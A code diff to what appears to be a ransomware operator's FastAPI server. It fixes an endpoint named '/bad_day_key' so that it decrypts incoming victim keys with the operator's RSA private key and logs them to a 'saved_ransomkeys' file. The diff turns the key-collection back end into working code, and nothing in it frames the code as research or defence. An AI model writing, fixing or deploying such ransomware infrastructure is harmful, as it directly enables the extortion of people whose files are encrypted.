@@ -10,7 +10,7 @@ app = FastAPI()
 
 
 class BadDayKey(BaseModel):
-    key: bytes
+    key: str
 
 
 def get_saved_key():
@@ -39,7 +39,9 @@ def get_public_key():
 @app.post("/bad_day_key")
 def save_ransom_key(key: BadDayKey):
     cipher_rsa = PKCS1_OAEP.new(get_private_key())
-    decrypted_ransomkey = cipher_rsa.encrypt(key.key)
+    decrypted_ransomkey = cipher_rsa.decrypt(bytes.fromhex(key.key))
 
     with open("saved_ransomkeys.txt", "a") as f:
-        f.write("ransom_key: " + decrypted_ransomkey.hex())
+        f.write("ransom_key: " + decrypted_ransomkey.hex() + "\n")
+
+    return {"status": "success"}
